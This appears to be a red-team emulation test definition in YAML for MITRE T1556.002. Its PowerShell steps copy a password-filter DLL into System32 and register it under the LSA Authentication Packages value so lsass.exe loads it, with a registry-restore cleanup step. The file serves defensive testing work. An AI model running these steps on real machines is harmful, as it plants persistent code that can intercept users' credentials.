api_version: "2.0"
name: Install Additional Authentication Packages
description: "lsass.exe loads all DLLs specified by the Authentication Packages REG_MULTI_SZ value.\nUses PowerShell to install and register a password filter DLL. Requires a reboot and administrative privileges.\nThe binary in bin is https://www.virustotal.com/gui/file/95140c1ad39fd632d1c1300b246293297aa272ce6035eecc3da56e337200221d/detection\nSource is in src folder. \nThis does require a reboot to see the filter loaded into lsass.exe. \nIt does require Administrative privileges to import the clean registry values back into LSA, it is possible you may have to manually do this after for cleanup.\n"
args:
    - name: dll_path
      type: path
      default: PathToAtomicsFolder\T1556.002\bin
    - name: dll_name
      type: string
      default: AtomicRedTeamPWFilter.dll
uuid: 91580da6-bc6e-431b-8b88-ac77180005f2
mitre:
    tactics:
        - 'TA0006: Credential Access'
        - 'TA0005: Defense Evasion'
        - 'TA0003: Persistence'
    techniques:
        - 'T1556: Modify Authentication Process'
    subtechniques:
        - 'T1556.002: Password Filter DLL'
requirements:
    platforms:
        - os: windows
steps:
    - name: install-additional-authentication-packages
      inline: |
        reg.exe export HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ "PathToAtomicsFolder\T1556.002\lsa_backup.reg"
        $passwordFilterName = (Copy-Item "{{.Args.dll_path}}\{{.Args.dll_name}}" -Destination "C:\Windows\System32" -PassThru).basename
        $lsaKey = Get-Item "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"
        $AuthenticationPackagesValues = $lsaKey.GetValue("Authentication Packages")
        $AuthenticationPackagesValues += $passwordFilterName
        Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\" "Authentication Packages" $AuthenticationPackagesValues
      executor: powershell
      cleanup:
        inline: |
            reg.exe import "PathToAtomicsFolder\T1556.002\lsa_backup.reg"
            remove-item C:\Windows\System32\{{.Args.dll_name}}
        executor: powershell
